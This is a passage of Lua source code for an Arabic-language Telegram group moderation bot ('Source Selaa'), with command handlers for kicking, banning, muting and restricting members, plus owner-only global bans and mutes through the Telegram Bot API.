absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الكتم$") and ChCheck(msg) or text:match("^تعطيل التقييد$") and ChCheck(msg) then
Selaa:set(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_,"true")
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الكتم والتقيد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
if BasicConstructor(msg) then
if text:match("^تفعيل الرفع$") and ChCheck(msg) or text:match("^تفعيل الترقيه$") and ChCheck(msg) then
Selaa:del(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تفعيل رفع ⇇ الادمن • المميز', 1, 'md')
end
if text:match("^تعطيل الرفع$") and ChCheck(msg) or text:match("^تعطيل الترقيه$") and ChCheck(msg) then
Selaa:set(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_,"true")
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تعطيل رفع ⇇ الادمن • المميز', 1, 'md')
end
end
--     Source Selaa     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع طرد ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"↯☆لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع طرد ⇇ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"↯☆لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم طرده من المجموعه")  
end,nil)
end
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) then
local user = text:match('طرد (%d+)')
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع طرد ⇇ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"↯☆لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"reply","↯☆تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source Selaa     --
--          Ban           --
if Admin(msg) then
local text = msg.content_.text_:gsub('حضر','حظر')
if text ==('حظر') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع حظر ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"↯☆لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
Selaa:sadd(Selaa..'Selaa:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and text:match('^حظر @(.*)') and ChCheck(msg) then
local username = text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع حظر ⇇ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"↯☆لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
Selaa:sadd(Selaa..'Selaa:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم حظره من المجموعه")  
end,nil) 
end
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and text:match('^حظر (%d+)') and ChCheck(msg) then
local user = text:match('حظر (%d+)')
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع حظر ⇇ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"↯☆لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
Selaa:sadd(Selaa..'Selaa:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","↯☆تم حظره من المجموعه")  
end,nil) 
end
end
--     Source Selaa     --
--         UnBan          --
local text = msg.content_.text_:gsub('الغاء الحظر','الغاء حظر')
if text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
Selaa:srem(Selaa..'Selaa:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and text:match('^الغاء حظر @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"reply","↯☆تم الغاء حظره من المجموعه")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and text:match('^الغاء حظر (%d+)') and ChCheck(msg) then
local user = text:match('الغاء حظر (%d+)')
Selaa:srem(Selaa..'Selaa:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"reply","↯☆تم الغاء حظره من المجموعه")  
end 
end 
--     Source Selaa     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع كتم ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆هو بالفعل مكتوم من المجموعه")  
else
Selaa:sadd(Selaa..'Selaa:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع كتم ⇇ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"reply","↯☆هو بالفعل مكتوم من المجموعه")  
else
Selaa:sadd(Selaa..'Selaa:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم كتمه من المجموعه")  
end
end
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع كتم ⇇ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"reply","↯☆هو بالفعل مكتوم من المجموعه")  
else
Selaa:sadd(Selaa..'Selaa:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","↯☆تم كتمه من المجموعه")  
end
end
end
--     Source Selaa     --
--         UnMute         --
local text = msg.content_.text_:gsub('الغاء الكتم','الغاء كتم')
if text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆هو ليس مكتوم لالغاء كتمه")  
else
Selaa:srem(Selaa..'Selaa:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and text:match('^الغاء كتم @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"reply","↯☆هو ليس مكتوم لالغاء كتمه")  
else
Selaa:srem(Selaa..'Selaa:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم الغاء كتمه من المجموعه")  
end
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and text:match('^الغاء كتم (%d+)') and ChCheck(msg) then
local user = text:match('الغاء كتم (%d+)')
if not Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"reply","↯☆هو ليس مكتوم لالغاء كتمه")  
else
Selaa:srem(Selaa..'Selaa:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","↯☆تم الغاء كتمه من المجموعه")  
end
end 
end 
--     Source Selaa     --
--          Tkeed           --
if Admin(msg) then
local text = msg.content_.text_:gsub('تقيد','تقييد')
if text ==('تقييد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تقيد ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and text:match('^تقييد @(.*)') and ChCheck(msg) then
local username = text:match('^تقييد @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تقيد ⇇ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تقيده من المجموعه")  
end
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and text:match('^تقييد (%d+)') and ChCheck(msg) then
local user = text:match('تقييد (%d+)')
if not Constructor(msg) and Selaa:get(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯☆لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تقيد ⇇ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","↯☆تم تقيده من المجموعه")  
end
end
--     Source Selaa     --
--         UnTkeed          --
local text = msg.content_.text_:gsub('الغاء تقيد','الغاء تقييد')
if text ==('الغاء تقييد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and text:match('^الغاء تقييد @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم الغاء تقيده من المجموعه")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and text:match('^الغاء تقييد (%d+)') and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","↯☆تم الغاء تقيده من المجموعه")  
end
end 
end
--     Source Selaa     --
--         BanAll         --
if Sudo(msg) then
local text = msg.content_.text_:gsub('حضر عام','حظر عام')
if text ==('حظر عام') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
Selaa:sadd(Selaa..'Selaa:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and text:match('^حظر عام @(.*)') then
local username = text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
Selaa:sadd(Selaa..'Selaa:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم حظره عام من المجموعات")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and text:match('^حظر عام (%d+)') then
local user = text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(user) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
Selaa:sadd(Selaa..'Selaa:BanAll:', user)
ReplyStatus(msg,user,"reply","↯☆تم حظره عام من المجموعات")  
end
--     Source Selaa     --
--         MuteAll        --
if text ==('كتم عام') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
Selaa:sadd(Selaa..'Selaa:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if result.id_ then
Selaa:sadd(Selaa..'Selaa:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم كتمه عام من المجموعات")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(user) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
Selaa:sadd(Selaa..'Selaa:MuteAll:', user)
ReplyStatus(msg,user,"reply","↯☆تم كتمه عام من المجموعات")  
end
--     Source Selaa     --
--         UnAll          --
local text = msg.content_.text_:gsub('الغاء العام','الغاء عام')
if text ==('الغاء عام') then
function UnAllReply(extra, result, success)
Selaa:srem(Selaa..'Selaa:BanAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and text:match('^الغاء عام @(.*)') then
local username = text:match('^الغاء عام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:BanAll:', result.id_)
Selaa:srem(Selaa..'Selaa:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and text:match('^الغاء عام (%d+)') then
local user = text:match('الغاء عام (%d+)')
Selaa:srem(Selaa..'Selaa:BanAll:', user)
Selaa:srem(Selaa..'Selaa:MuteAll:', user)
ReplyStatus(msg,user,"reply","↯☆تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source Selaa     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if Selaa:sismember(Selaa..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المطايه") 
Selaa:sadd(Selaa..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Selaa     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not Selaa:sismember(Selaa..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆هو ليس مطي ليتم تنزيله") 
else
Selaa:srem(Selaa..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المطايه") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Selaa     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تقيد ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تقيده لمدة ⇇ "..mutept.." د") 
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
